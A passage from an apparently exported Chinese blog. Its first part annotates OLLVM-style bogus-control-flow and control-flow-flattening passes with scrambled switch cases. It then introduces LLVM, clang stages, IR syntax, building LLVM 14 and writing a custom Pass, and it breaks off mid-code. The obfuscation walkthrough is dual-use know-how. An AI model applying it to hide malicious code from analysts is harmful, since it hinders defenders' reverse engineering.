DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Erase branch instruction:&quot; &lt;&lt; *((BranchInst*)*i) &lt;&lt; &quot;\\n&quot;); (*i)-&gt;eraseFromParent(); // 删除之前的永真条件分支 &#125; // 删除之前存储的Fcmp指令 for(std::vector&lt;Instruction*&gt;::iterator i =toDelete.begin();i!=toDelete.end();++i)&#123; DEBUG_WITH_TYPE(&quot;gen&quot;, errs() &lt;&lt; &quot;bcf: Erase condition instruction:&quot; &lt;&lt; *((Instruction*)*i)&lt;&lt; &quot;\\n&quot;); (*i)-&gt;eraseFromParent(); &#125;.... return true; &#125; // end of doFinalization &#125;; // end of struct BogusControlFlow : public FunctionPass&#125; Flattening控制流平坦化https://zhuanlan.zhihu.com/p/39479793 FunctionPass混淆在flatten函数中进行 1234567891011struct Flattening : public FunctionPass &#123; static char ID; // Pass identification, replacement for typeid bool flag; Flattening() : FunctionPass(ID) &#123;&#125; Flattening(bool flag) : FunctionPass(ID) &#123; this-&gt;flag = flag; &#125; bool runOnFunction(Function &amp;F); bool flatten(Function *f);&#125;;&#125; flatten12345678910111213141516bool Flattening::flatten(Function *f) &#123; vector&lt;BasicBlock *&gt; origBB; BasicBlock *loopEntry; BasicBlock *loopEnd; LoadInst *load; SwitchInst *switchI; AllocaInst *switchVar; // 或获取一个 16 字节的随机密钥 char scrambling_key[16]; llvm::cryptoutils-&gt;get_bytes(scrambling_key, 16); //转换函数中的 switch 语句 FunctionPass *lower = createLowerSwitchPass(); lower-&gt;runOnFunction(*f); reateLowerSwitchPass() 是一个函数，可能是用来创建一个 FunctionPass 的实例，这个 pass 的功能是将 switch 语句转换成等价的控制流结构 遍历函数基本块：遍历 f 中的每个基本块，并将它们存储在 origBB 向量中。 **检查 InvokeInst**：如果任何一个基本块的终止指令是 InvokeInst，则立即返回 false，不进行后续处理。这表明函数中如果有异常处理结构（invoke 调用），则不执行平坦化操作。 检查基本块数量：如果函数只有一个或没有基本块，返回 false，表示没有需要平坦化的内容。 移除第一个基本块：如果基本块数量大于 1，移除第一个基本块，可能是为了跳过不需要处理的起始块。 1234567891011121314151617181920//这行代码遍历所有基本块,将基本块添加到 origBB 向量中for (Function::iterator i = f-&gt;begin(); i != f-&gt;end(); ++i) &#123; BasicBlock *tmp = &amp;*i; origBB.push_back(tmp); BasicBlock *bb = &amp;*i; //如果函数中存在异常处理的调用，flatten 操作将被中止，因为这种结构无法被简单地“平坦化”。 //InvokeInst 是 LLVM 中的一种特殊的函数调用指令，用于调用可能抛出异常的函数 if (isa&lt;InvokeInst&gt;(bb-&gt;getTerminator())) &#123;//bb-&gt;getTerminator() 返回当前基本块的终止指令 return false; &#125;&#125;// 如果基本块数量小于等于 1，函数返回 false，表示没有操作的必要。if (origBB.size() &lt;= 1) &#123; return false;&#125;// 删除origBB.begin() 位置的元素。为了去除函数中的某个起始基本块origBB.erase(origBB.begin()); 为什么基本块中含有 InvokeInst 就不进行平坦化处理？ 在 LLVM 的中间表示（IR）中，InvokeInst 的特殊性决定了当函数中包含此类指令时，不能进行平坦化处理（flattening）。这是因为 InvokeInst 涉及到异常处理机制，且其控制流路径较为复杂。具体原因如下： 异常处理路径的特殊性：InvokeInst 指令的控制流具有两个后继基本块： 正常路径：如果没有异常发生，控制流按照正常路径继续。 异常路径：如果发生异常，控制流转移到异常处理的基本块，通常是以 LandingPadInst 为开头的基本块。 LandingPadInst 的约束：LandingPadInst 是用于异常处理的指令，它必须位于异常处理路径的开头，并且只能通过 InvokeInst 来访问。因此，LandingPadInst 不应该出现在普通的控制流中，而应该通过 InvokeInst 来“保护”。 控制流的平坦化：控制流平坦化（flattening）通常是将多个基本块合并成一个较为简单的结构。在存在 InvokeInst 的情况下，平坦化操作可能会导致异常处理路径无法正常工作，因为平坦化可能会打破异常路径和 LandingPadInst 之间的正确关系。如果将 LandingPadInst 放入了一个非异常路径的基本块中，或者将异常处理路径错误地合并到正常路径中，就会导致异常机制的破坏，进而引发控制流错误或运行时错误。 避免破坏异常控制流：为了保持异常处理机制的完整性，LLVM 在检测到 InvokeInst 时会避免对包含该指令的函数进行平坦化处理，以防止控制流出现混乱。具体来说，如果函数中包含 InvokeInst，它的异常处理路径必须独立于其他控制流路径，以确保异常能够被正确捕获和处理。 检查基本块的终止指令是否为条件跳转或具有多个后继基本块，如果是，则需要拆分基本块。 拆分基本块：将终止指令前的指令分割到新的基本块中。删除原基本块中的终止指令，以便后续调整控制流。 12345678910111213141516171819202122232425262728 //获取函数f中的第一个基本块 Function::iterator tmp = f-&gt;begin(); //++tmp; BasicBlock *insert = &amp;*tmp; // 检查 insert 基本块的终止指令是否是一个 BranchInst（跳转指令） BranchInst *br = NULL; if (isa&lt;BranchInst&gt;(insert-&gt;getTerminator())) &#123; br = cast&lt;BranchInst&gt;(insert-&gt;getTerminator()); &#125; //判断检查是否需要对当前的基本块进行拆分 //如果 br（跳转指令）不为空，并且 br 是一个条件跳转（即根据条件选择两个不同的跳转目标），则需要拆分基本块。 //如果基本块的终止指令有多个后继（即该基本块跳转到多个不同的基本块），也需要拆分。 if ((br != NULL &amp;&amp; br-&gt;isConditional()) ||insert-&gt;getTerminator()-&gt;getNumSuccessors() &gt; 1) &#123; //初始化一个迭代器 i，指向基本块 insert 的最后一条指令，然后将 i 向前移动一个位置，指向最后一条指令之前的位置。 BasicBlock::iterator i = insert-&gt;end(); --i; //确定拆分点的位置，通常拆分点位于控制流指令（如 br）之前。 if (insert-&gt;size() &gt; 1) &#123; --i; &#125; //将基本块 insert 从指令 i 处分割成两个基本块 BasicBlock *tmpBB = insert-&gt;splitBasicBlock(i, &quot;first&quot;); //将新创建的基本块 tmpBB 插入到 origBB 向量的开头 origBB.insert(origBB.begin(), tmpBB); &#125;// 删除函数f中的终止指令（即跳转指令） insert-&gt;getTerminator()-&gt;eraseFromParent(); 构建一个基于 switch 的循环结构，用于实现控制流平坦化。具体逻辑如下： 创建一个循环入口和结束基本块： loopEntry 作为 switch 的入口。 loopEnd 作为循环的终点，并跳转回 loopEntry。 创建并初始化 switch 控制变量： 使用 switchVar 作为控制流选择的依据，并通过 LoadInst 从中加载值。 设置 switch 指令的默认行为： 创建 swDefault 作为默认分支，处理意外情况。 调整原控制流： 将第一个基本块插入新的循环逻辑中，并删除其原有的跳转逻辑。 引入 switch 指令： 使用 switch 指令将控制流转化为基于数值的分支跳转。 1234567891011121314151617181920212223242526272829303132 // 创建 switch 变量 switchVar =new AllocaInst(Type::getInt32Ty(f-&gt;getContext()), 0, &quot;switchVar&quot;, insert); new StoreInst( ConstantInt::get(Type::getInt32Ty(f-&gt;getContext()), llvm::cryptoutils-&gt;scramble32(0, scrambling_key)), switchVar, insert); // 创建两个基本块 loopEntry = BasicBlock::Create(f-&gt;getContext(), &quot;loopEntry&quot;, f, insert);//循环入口基本块，作为 switch 的入口 loopEnd = BasicBlock::Create(f-&gt;getContext(), &quot;loopEnd&quot;, f, insert);//循环结束基本块，控制流回到 loopEntry//在 loopEntry 中插入一条 LoadInst 指令，用于从 switchVar 加载当前值。这一值决定了 switch 的分支跳转。 load = new LoadInst(switchVar, &quot;switchVar&quot;, loopEntry); // 将原来的第一个基本块（insert）移动到 loopEntry 的前面。 insert-&gt;moveBefore(loopEntry);//在 insert 的末尾插入一条无条件跳转指令，跳转到 loopEntry，将控制流接入新的循环逻辑。 BranchInst::Create(loopEntry, insert); //设置 loopEnd 跳转回 loopEntry BranchInst::Create(loopEntry, loopEnd); //创建 switch 默认分支 BasicBlock *swDefault =BasicBlock::Create(f-&gt;getContext(), &quot;switchDefault&quot;, f, loopEnd); BranchInst::Create(loopEnd, swDefault);//在 swDefault 的末尾插入一条无条件跳转指令，使其跳转到 loopEnd // 创建 switch 指令并设置条件 switchI = SwitchInst::Create(&amp;*f-&gt;begin(), swDefault, 0, loopEntry); switchI-&gt;setCondition(load); //删除第一个基本块的原始终止指令 f-&gt;begin()-&gt;getTerminator()-&gt;eraseFromParent();//在第一个基本块的末尾插入一条无条件跳转指令，使其直接跳转到 loopEntry，将控制流引入新的循环逻辑。 BranchInst::Create(loopEntry, &amp;*f-&gt;begin()); **遍历所有原始基本块 (origBB)**：每个基本块代表程序逻辑中的一个独立部分。 调整基本块位置：将这些基本块移动到 loopEnd 之前，仅调整它们在 IR 中的视觉顺序，不影响实际逻辑。 为 switch 添加分支： 通过 scramble32 生成混淆后的 case 值，增加逆向工程的难度。 使用 addCase 方法将每个基本块与对应的 case 值关联起来。 1234567891011121314// 遍历origBB的所有基本块for (vector&lt;BasicBlock *&gt;::iterator b = origBB.begin(); b != origBB.end();++b) &#123; BasicBlock *i = *b; ConstantInt *numCase = NULL; //将当前基本块 i 移动到 loopEnd 之前 i-&gt;moveBefore(loopEnd); // 创建并添加 switch case numCase = cast&lt;ConstantInt&gt;(ConstantInt::get( switchI-&gt;getCondition()-&gt;getType(), llvm::cryptoutils-&gt;scramble32(switchI-&gt;getNumCases(), scrambling_key))); switchI-&gt;addCase(numCase, i);&#125; 将基本块的分支逻辑转化为对 switch 指令变量的更新操作，从而实现通过 switch 指令完成所有分支跳转 处理无后继基本块：跳过不影响控制流的基本块（如返回块）。 处理单分支基本块：直接将后继基本块的 case 值存储到 switch 变量。 处理双分支基本块：根据分支条件选择对应的 case 值，并存储到 switch 变量。 跳转到循环结束：所有处理后的基本块统一跳转到 loopEnd，形成平坦化的控制流。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778//遍历origBB中的每个基本块for (vector&lt;BasicBlock *&gt;::iterator b = origBB.begin(); b != origBB.end();++b) &#123; BasicBlock *i = *b; ConstantInt *numCase = NULL; // 如果基本块 i 没有后继（如 return 或 unreachable 的基本块），直接跳过 if (i-&gt;getTerminator()-&gt;getNumSuccessors() == 0) &#123; continue; &#125; // 处理单分支（非条件跳转）的基本块 if (i-&gt;getTerminator()-&gt;getNumSuccessors() == 1) &#123;//如果基本块的终止指令只有一个后继基本块，说明是无条件跳转 //使用 getSuccessor(0) 获取后继基本块指针 BasicBlock *succ = i-&gt;getTerminator()-&gt;getSuccessor(0); // 删除该基本块原本的跳转指令 i-&gt;getTerminator()-&gt;eraseFromParent(); // 查找后继基本块对应的 switch case 值 numCase = switchI-&gt;findCaseDest(succ); //如果后继基本块没有明确的 case 值（对应 switchDefault），生成一个加扰后的默认值 if (numCase == NULL) &#123; numCase = cast&lt;ConstantInt&gt;( ConstantInt::get(switchI-&gt;getCondition()-&gt;getType(), llvm::cryptoutils-&gt;scramble32( switchI-&gt;getNumCases() - 1, scrambling_key))); &#125; // 使用 StoreInst 将计算出的 numCase 存入 switchVar new StoreInst(numCase, load-&gt;getPointerOperand(), i); //将基本块的控制流引导到 loopEnd BranchInst::Create(loopEnd, i); continue; &#125; // 处理双分支（条件跳转）的基本块 if (i-&gt;getTerminator()-&gt;getNumSuccessors() == 2) &#123; // Get next cases ConstantInt *numCaseTrue =switchI-&gt;findCaseDest(i-&gt;getTerminator()-&gt;getSuccessor(0)); ConstantInt *numCaseFalse =switchI-&gt;findCaseDest(i-&gt;getTerminator()-&gt;getSuccessor(1)); // Check if next case == default case (switchDefault) if (numCaseTrue == NULL) &#123; numCaseTrue = cast&lt;ConstantInt&gt;( ConstantInt::get(switchI-&gt;getCondition()-&gt;getType(), llvm::cryptoutils-&gt;scramble32( switchI-&gt;getNumCases() - 1, scrambling_key))); &#125; if (numCaseFalse == NULL) &#123; numCaseFalse = cast&lt;ConstantInt&gt;( ConstantInt::get(switchI-&gt;getCondition()-&gt;getType(), llvm::cryptoutils-&gt;scramble32( switchI-&gt;getNumCases() - 1, scrambling_key))); &#125; // 根据分支条件 br-&gt;getCondition() 创建一个选择器 sel BranchInst *br = cast&lt;BranchInst&gt;(i-&gt;getTerminator()); SelectInst *sel = SelectInst::Create(br-&gt;getCondition(), numCaseTrue, numCaseFalse, &quot;&quot;, i-&gt;getTerminator());//sel 的值为 numCaseTrue 或 numCaseFalse，取决于分支条件 // 删除条件跳转指令（br i-&gt;getTerminator()-&gt;eraseFromParent(); // 使用 StoreInst 将选择器结果存储到 switchVar，以更新 switch 的控制变量 new StoreInst(sel, load-&gt;getPointerOperand(), i); //将当前基本块跳转到 loopEnd BranchInst::Create(loopEnd, i); continue; &#125; &#125;//用于修复函数堆栈布局，以确保转换后的 IR 在运行时堆栈一致性 fixStack(f); return true;&#125;","categories":[],"tags":[],"keywords":[]},{"title":"LLVM初探","slug":"LLVM入门","date":"2024-11-29T01:30:05.000Z","updated":"2024-12-03T13:03:22.358Z","comments":true,"path":"2024/11/29/LLVM入门/","link":"","permalink":"http://example.com/2024/11/29/LLVM%E5%85%A5%E9%97%A8/","excerpt":"","text":"LLVM简介LLVM（Low Level Virtual Machine）是一个开源的编译器基础架构，它最初是作为一种中间表示（IR）语言和一个优化框架设计的，目标是支持高效的编译和生成可执行代码。LLVM并不只是一种编译器，而是一个编译工具链，旨在为现代编程语言提供高度可重用的编译工具。如果需要支持一种新的编程语言，那么只需要在LLVM中实现一个新的前端即可。如果需要支持一种新的硬件设备，那么只需要在LLVM中实现一个新的后端即可。无论是怎样的前端后端，代码进行编译优化等操作都会借助IR代码来进行。 LLVM的核心目标是提供一套可移植、模块化、可扩展的编译工具链，它能够支持多种硬件架构并进行代码优化。 组成： LLVM前端: 前端负责将源代码转换为LLVM IR。LLVM本身并不提供这些语言的前端，而是通过外部项目来提供。例如，clang是一个基于LLVM的C&#x2F;C++&#x2F;Objective-C前端，它会将C语言源代码转换成LLVM IR。交付给优化器。LLVM支持两种前端：clang和基于GNU编译器集合解析器的前端。 LLVM优化器（LLVM Optimizer）: 优化器负责删除IR代码中的冗余代码和死代码、简化控制流图等。之后将结果传送给后端。优化的目的是提高代码的效率，减少资源消耗。LLVM提供了大量的优化算法。 LLVM后端: 根据目标架构生成高效的汇编代码。后端将LLVM IR转化为目标机器代码。后端的任务包括寄存器分配、指令选择、目标特定优化等。 LLVM的运行流程分为以下主要阶段： 前端（Front-End）：将源代码（如C&#x2F;C++&#x2F;Rust等）通过clang转换为LLVM IR。 中端（Middle-End）：优化和分析LLVM IR。（主要使用的是Pass） 后端（Back-End）：将优化后的LLVM IR生成目标机器代码。 clangClang 是 LLVM 项目中的 C&#x2F;C++&#x2F;Objective-C 编译器前端，提供了完整的编译器功能，包括从源代码到目标代码的整个流程。它的核心任务是将高级语言源代码解析为 LLVM 中间表示（IR），并最终交给 LLVM 的中间端和后端完成优化和代码生成。 与gcc相比： 1.编译速度快:在某些平台上，Clang的编译速度显著的快过GCC(Debug模式下编译OC速度比GGC快3倍) 2.占用内存小:Clang生成的AST所占用的内存是GCC的五分之一左右 3.模块化设计:Clang采用基于库的模块化设计，易于 IDE 集成及其他用途的重用 4.诊断信息可读性强:在编译过程中，Clang 创建并保留了大量详细的元数据 (metadata)，有利于调试和错误 报告 5.设计清晰简单，容易理解，易于扩展增强 Clang 的运行流程大致可以分为几个主要步骤：预处理（Preprocessing）、词法分析（Lexical Analysis）、语法分析（Parsing）、语义分析（Semantic Analysis）、代码生成（Code Generation） 以及 优化（Optimization） 词法分析Clang 的词法分析是编译过程中的第一个重要步骤，负责将源代码文本转换成一系列的标记（tokens）。这些标记将为后续的语法分析和语义分析提供基础。Clang 的词法分析是基于 C++ 编写的，它的设计非常模块化，并与预处理器（Preprocessor）紧密协作，支持复杂的编译需求（如宏展开、条件编译等）。在 Clang 中，词法分析器的核心部分由 Lexer 类实现。 词法分析的主要目标是： 生成标记（Tokens）：将源代码分解成易于分析的基本单元。 丢弃无用字符：如空格、注释等。 错误检测：如非法字符或语法错误的报告。 1$clang -fmodules -E -Xclang -dump-tokens main.m 示例： 123456789101112int main() &#123; return 0;&#125;Token: &#x27;int&#x27; [Source: input.c:1:1]Token: identifier &#x27;main&#x27; [Source: input.c:1:5]Token: &#x27;(&#x27; [Source: input.c:1:9]Token: &#x27;)&#x27; [Source: input.c:1:10]Token: &#x27;&#123;&#x27; [Source: input.c:1:12]Token: &#x27;return&#x27; [Source: input.c:2:5]Token: numeric_constant &#x27;0&#x27; [Source: input.c:2:12]Token: &#x27;;&#x27; [Source: input.c:2:13]Token: &#x27;&#125;&#x27; [Source: input.c:3:1] 语法分析——生成语法树（AST）Clang 的语法分析阶段是编译过程中的关键步骤之一，负责将词法分析（Lexer）阶段生成的标记（tokens）转换成 抽象语法树（Abstract Syntax Tree，AST）。AST 是源代码的树形表示，其中每个节点代表程序中的一个语法结构（如声明、表达式、语句等）。AST 结构相对较高层次，便于进行语义分析、优化和后续的代码生成。 在 Clang 中，Parser 类负责执行语法分析，它基于语言的文法规则将标记（tokens）构建成抽象语法树。 Parser 的工作流程 标记读取：每次 Parser 读取一个标记（Token）并决定该标记对应的语法结构。 递归解析：Parser 会递归调用相应的语法规则方法，构建子树并连接到父节点。 错误报告：如果在语法分析过程中遇到不符合文法的标记，Parser 会生成错误报告。 1$clang -fmodules -fsyntax-only -Xclang -ast-dump main.m 12345678FunctionDecl 0x55615b7f4400 &lt;input.c:1:1, line:3:1&gt; line:1:1 add &#x27;int&#x27; ParmVarDecl 0x55615b7f3b00 &lt;col:7, col:8&gt; &#x27;int&#x27; a VarDecl 0x55615b7f3b00 &lt;col:7, col:8&gt; &#x27;int&#x27; a VarDecl 0x55615b7f3c40 &lt;col:13, col:14&gt; &#x27;int&#x27; b CompoundStmt 0x55615b7f4960 &lt;line:2:1, col:16&gt; ReturnStmt 0x55615b7f47e0 &lt;line:3:5, col:16&gt; BinaryOperator 0x55615b7f4730 &lt;col:12, col:13&gt; &#x27;int&#x27; &#x27;+&#x27; DeclRefExpr 0x55615b7f4650 &lt;col:12&gt; &#x27;int&#x27; lvalue Var 0x55615b7f3b00 &#x27;a&#x27; DeclRefExpr 0x55615b7f4690 &lt;col:14&gt; &#x27;int&#x27; lvalue Var 0x55615b7f3c40 &#x27;b&#x27; 语义分析，生成中间码IR通过ASTConsumer函数换成IR代码 Clang 的 语义分析（Semantic Analysis）是编译过程中的一个重要阶段，负责确保程序的语法结构不仅符合语言的文法规则，而且符合语言的语义规则。在这一阶段，编译器会检查程序中的类型、作用域、符号定义等方面的错误，并生成符号表以支持后续的代码生成和优化。Clang 的语义分析是基于 AST 的遍历实现的。 语义分析的目标是确保代码的含义（而非语法）是正确的，例如： 类型检查：确保变量、表达式和函数调用的类型匹配。 符号查找：确保所有使用的变量和函数在作用域内已经声明。 作用域管理：确保变量和函数在适当的作用域内被使用。 常量折叠：对常量表达式进行计算并简化代码。 IR不同的前端后端使用统一的中间代码LLVM Intermediate Representation (LLVM IR) 。它是LLVM优化和代码生成的基础。LLVM IR设计为目标无关的中间层，支持多种语言和架构。 特点： 三种表示形式： 文本格式（.ll）：人类可读的纯文本表示，便于调试和分析。text $ clang -S -emit-llvm main.m 123- **二进制格式（.bc）**：高效的存储和传输格式，用于编译器内部。bitcode- ```shell $ clang -c -emit-llvm main.m 内存表示：编译器运行时使用的内存结构，由LLVM API操控。memory 面向静态单赋值（SSA）形式： LLVM IR使用SSA形式，这意味着每个变量在其作用域内只能被赋值一次。 SSA形式使数据流分析和优化（如常量传播、冗余消除）更加高效。 LLVM IR是由基本块（Basic Block）组成的，基本块是一系列顺序执行的指令，程序的控制流通过基本块间的跳转来实现。示例： IR基本语法注释以分号；开头全局标识符以@开头，局部标识符以%开头alloca，在当前函数栈帧中分配内存i32，32bit，4个字节的意思align，内存对齐store，写入数据load，读取数据 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdio.h&gt;int factorial(int n) &#123; if (n &lt;= 1) &#123; return 1; &#125; else &#123; return n * factorial(n - 1); &#125;&#125;int main() &#123; int num = 5; int result = factorial(num); printf(&quot;Factorial of %d is %d\\n&quot;, num, result); return 0;&#125;; ModuleID = &#x27;factorial.c&#x27;source_filename = &quot;factorial.c&quot;define i32 @factorial(i32 %n) &#123;entry: ; 比较 n 是否小于等于 1 %cmp = icmp sle i32 %n, 1 br i1 %cmp, label %return_one, label %recursive_casereturn_one: ; 函数返回 1 ret i32 1recursive_case: ; 递归调用 factorial(n-1) %dec = sub i32 %n, 1 ; 计算 n-1 %rec_result = call i32 @factorial(i32 %dec) ; 调用 factorial(n-1) %mul = mul i32 %n, %rec_result ; 计算 n * factorial(n-1) ret i32 %mul ; 返回结果&#125;define i32 @main() &#123;entry: ; 初始化 num 为 5 %num = alloca i32, align 4 store i32 5, i32* %num, align 4 ; 调用 factorial(5) %num_load = load i32, i32* %num, align 4 %factorial_result = call i32 @factorial(i32 %num_load) ; 打印结果 %printf_args = alloca [40 x i8], align 1 store [40 x i8] c&quot;Factorial of %d is %d\\0A\\00&quot;, [40 x i8]* %printf_args, align 1 %0 = load [40 x i8], [40 x i8]* %printf_args, align 1 %1 = call i32 (i8*, ...) @printf(i8* %0, i32 %num_load, i32 %factorial_result) ; 返回 0 ret i32 0&#125;declare i32 @printf(i8*, ...) ; 外部声明 printf 函数 Clang： Clang编译器将C&#x2F;C++&#x2F;Objective-C代码转换为LLVM IR。 LLVM优化工具： opt 工具用于对LLVM IR进行优化。 IR解释器： lli 可直接运行LLVM IR代码。 分析工具： 可以使用llvm-dis将二进制IR转换为文本格式，或llvm-as将文本IR转为二进制。 将C语言代码转换成LLVM IR1clang -emit-llvm -S hello.c -o hello.ll passhttps://llvm.org/docs/WritingAnLLVMPass.html#quick-start-writing-hello-world 在 LLVM 中，Pass 是对中间表示（IR）进行分析和优化的基本单元。Pass 通常由编译器的不同阶段使用，以提高生成代码的效率、执行速度、空间利用率等。LLVM 的 Pass 架构是模块化和可定制的，每个 Pass 关注 IR 的特定方面，如优化、分析、验证等。 Pass 可以分为以下几类： 分析 Pass：分析 IR 中的数据流、控制流、依赖关系等，通常不会改变 IR。 转换 Pass（Optimization Pass）：修改 IR，通常是为了进行优化，提高程序的性能。 验证 Pass：确保 IR 符合 LLVM 的内部约定和规范，防止错误的 IR 影响后续处理。 后端 Pass：在将 IR 转换为机器代码之前执行，通常包括目标特定的优化。 Pass 的结构每个 Pass 都是一个类，并继承自 llvm::Pass 或其子类。在 Pass 类中，你会看到以下结构： 初始化：Pass 通常在创建时会进行初始化，设置相关的标志或配置。 运行：Pass 的核心逻辑通常在 runOnFunction、runOnModule 或 runOnBasicBlock 方法中实现。这些方法定义了 Pass 在不同级别的操作。 结束：Pass 完成后，LLVM 会处理 Pass 的结果，更新 IR 或将 IR 传递给下一个 Pass。 如何使用和自定义 Pass** 使用内置 Pass**LLVM 提供了许多内置的 Pass，用户可以通过 opt 工具或者在程序中手动插入这些 Pass 来应用优化。 使用 opt 工具运行 Pass： 1opt -O2 input.bc -o output.bc # 使用优化 Pass 其中，-O2 是优化级别，input.bc 是输入的 LLVM IR 文件，output.bc 是输出的优化后的 IR 文件。 通过编程接口使用 Pass： 如果你在开发自己的应用程序，可以使用 LLVM API 来加载模块并应用 Pass。 1234llvm::PassManager PM;PM.add(llvm::createDeadCodeEliminationPass()); // 添加 DCE PassPM.add(llvm::createFunctionInliningPass()); // 添加内联 PassPM.run(M); // M 是一个 llvm::Module 对象 自定义 Pass如果你需要实现自己的 Pass，可以通过继承 llvm::FunctionPass、llvm::ModulePass 等类来定义一个新的 Pass。例如，下面是一个简单的函数级 Pass 示例： 1234567891011121314151617181920#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/IR/Module.h&quot;using namespace llvm;namespace &#123; struct MyFunctionPass : public FunctionPass &#123; static char ID; MyFunctionPass() : FunctionPass(ID) &#123;&#125; bool runOnFunction(Function &amp;F) override &#123; // 在此修改 F（一个 llvm::Function 对象） errs() &lt;&lt; &quot;Function: &quot; &lt;&lt; F.getName() &lt;&lt; &quot;\\n&quot;; return false; // 该 Pass 不修改 IR &#125; &#125;;&#125;char MyFunctionPass::ID = 0;static RegisterPass&lt;MyFunctionPass&gt; X(&quot;my-pass&quot;, &quot;My Function Pass&quot;, false, false); runOnFunction 方法中可以编写对 IR 的修改逻辑。ModulePass 也类似，只是它作用于整个模块。 RegisterPass 宏将 Pass 注册到 LLVM 中，以便可以通过 opt 或其他工具使用。 Pass 管理系统LLVM 提供了 PassManager 类用于管理和运行一组 Pass。PassManager 会负责执行每个 Pass，自动处理 Pass 之间的依赖关系，以及控制 Pass 的执行顺序。 FunctionPassManager：用于管理和运行函数级别的 Pass。 ModulePassManager：用于管理和运行模块级别的 Pass。 Pass 的优化级别LLVM 提供了多种优化级别（-O1、-O2、-O3 等），每个级别对应一组优化 Pass。更高的优化级别通常会启用更多的优化 Pass，但可能会增加编译时间。例如，-O2 启用的 Pass 包括常量传播、死代码消除等，而 -O3 还会启用更高级的优化，如循环展开和向量化。 编译选择14.0.0版本 llvm-project-llvmorg-14.0.0 依赖参考安卓的一键安装https://source.android.com/docs/setup/build/initializing?hl=zh-cn 12345sudo apt install ninja-buildcd llvm-projectsudo cmake -S llvm -B build -G Ninja -DCMAKE_BUILD_TYPE=Release -DLLVM_ENABLE_PROJECTS=&quot;clang&quot;cd buildsudo ninja -j8 安装clion 然后使用Clion打开llvm目录下的CmakeLists.txt 进入settings，然后CMake里点击+会添加Release版本，我们需要在CMake 选项里填上我们之前编译时用的命令 然后多了两个目录： 然后进入这两个目录进行编译（时间有点久） 1sudo ninja -j8 clang编译c源码设置环境变量 1export PATH=~/tools/llvm/llvm-14.0.0/llvm/cmake-build-release/bin:$PATH 编译 1clang main.c -o hello_clang 调试Clang找到llvm&#x2F;llvm-14.0.0&#x2F;clang&#x2F;tools&#x2F;driver下driver.cpp的main函数位置下个断点 编译选择clang 设置运行参数 目录文件 -o 生成文件 &#x2F;home&#x2F;cruve&#x2F;CLionProjects&#x2F;untitled&#x2F;hello.c -o &#x2F;home&#x2F;cruve&#x2F;CLionProjects&#x2F;untitled&#x2F;test 然后运行调试。(前面没有编译debug模式，clion编译) 工具https://llvm.org/docs/GettingStarted.html#llvm-tools 工具名称 功能描述 用途 bugpoint 将给定的测试用例缩小到最小的通过和&#x2F;或仍然导致问题的指令数量，无论是崩溃还是错误编译 调试优化过程或代码生成后端 llc 将 LLVM IR 转换为特定架构的汇编代码 将 LLVM IR 生成汇编代码 llvm-as 将 LLVM IR 文本转换为二进制格式 将 LLVM IR 源代码编译为二进制格式 llvm-dis 将 LLVM 二进制文件转换为文本格式 将二进制 LLVM IR 文件转换为文本格式 opt LLVM IR 优化工具 执行各种类型的 LLVM IR 优化 llvm-link 链接多个 LLVM IR 文件 合并多个 .bc 文件 llvm-ar LLVM 归档工具 创建、修改或提取 .a 静态库文件 llvm-nm 显示目标文件的符号信息 查看目标文件中的符号表 llvm-objdump 反汇编目标文件并显示其内容 分析汇编代码、符号表，帮助调试 llvm-profdata 处理性能分析数据 生成和合并程序的覆盖率数据 llvm-cov 提供代码覆盖率信息 生成覆盖率报告，帮助测试和优化程序 lli LLVM JIT（即时编译器）解释器 执行 LLVM IR 代码 clang-tidy 静态分析工具，检查 C++ 代码中的潜在错误和风格问题 检查代码质量、潜在错误、风格问题 clang-format 自动格式化 C&#x2F;C++ 等语言的源代码 自动格式化源代码，确保代码风格一致 FileCheck 用于验证输出文件中是否包含预期文本 用于验证编译器的输出或 IR 是否符合预期 llvm-debug 用于调试目标文件的工具 调试 LLVM 编译的目标文件 自定义的PASSWriting an LLVM Pass (legacy PM version) — LLVM 20.0.0git documentation 看一下llvm自带的pass示例（llvm&#x2F;lib&#x2F;Transforms&#x2F;hello&#x2F;hello.cpp） 每当执行一个函数时就输出hello和函数名。 通过 errs() &lt;&lt; &quot;Hello: &quot;; 打印 &quot;Hello: &quot;，然后通过 F.getName() 获取当前函数的名称并输出，write_escaped 用于避免输出过程中发生特殊字符错误。 123456789101112131415namespace &#123; // Hello - The first implementation, without getAnalysisUsage. struct Hello : public FunctionPass &#123; static char ID; // Pass identification, replacement for typeid Hello() : FunctionPass(ID) &#123;&#125;//Hello 是一个继承自 FunctionPass 的结构体，表示这是一个对每个函数执行的 Pass。 bool runOnFunction(Function &amp;F) override &#123; ++HelloCounter; errs() &lt;&lt; &quot;Hello: &quot;; errs().write_escaped(F.getName()) &lt;&lt; &#x27;\\n&#x27;; return false; &#125; &#125;;&#125;static RegisterPass&lt;Hello&gt; X(&quot;hello&quot;, &quot;Hello World Pass&quot;);//将 Hello Pass 注册到 LLVM Pass 管理器中。 编译好的so文件在 1llvm-14.0.0/llvm/cmake-build-release/lib 使用方法 1opt -load /home/cruve/tools/llvm/llvm-14.0.0/llvm/cmake-build-release/lib/LLVMHello.so -help |grep hello 我们在Trasform的目录下新创一个目录：NewPass 该文件夹同样创建NewPass.cpp、CMakeLists.txt。NewPass.exports（为空） 在NewPass的CMakeLists.txt中参照hello的cmakelist修改下部分 1234567 set(LLVM_EXPORTED_SYMBOL_FILE $&#123;CMAKE_CURRENT_SOURCE_DIR&#125;/NewPass.exports)add_llvm_library( //表示向LLVM系统中添加一个库或者插件 LLVMNewPass MODULE //MODULE指定要创建的是模块，且模块名为LLVMNewPass NewPass.cpp //表示这个模块是通过编译NewPass.cpp文件来创建的 PLUGIN_TOOL //表示将这个模块作为一个插件工具 (PLUGIN_TOOL) 被使用 opt //指定PLUGIN_TOOL为opt，即通过opt能使用这个模块的功能) 然后在上级目录（Transforms）下的CMakeLists.txt中，添加新创建的目录： 1add_subdirectory(NewPass) 在NewPass.cpp 1234567891011121314151617181920#include &quot;llvm/Pass.h&quot;#include &quot;llvm/IR/Function.h&quot;#include &quot;llvm/Support/raw_ostream.h&quot;using namespace llvm;namespace &#123;struct NewPass : public FunctionPass&#123; static char ID; NewPass() : FunctionPass(ID)&#123;&#125; bool runOnFunction(Function &amp;F) override&#123; errs() &lt;&lt; &quot;NewPass in: 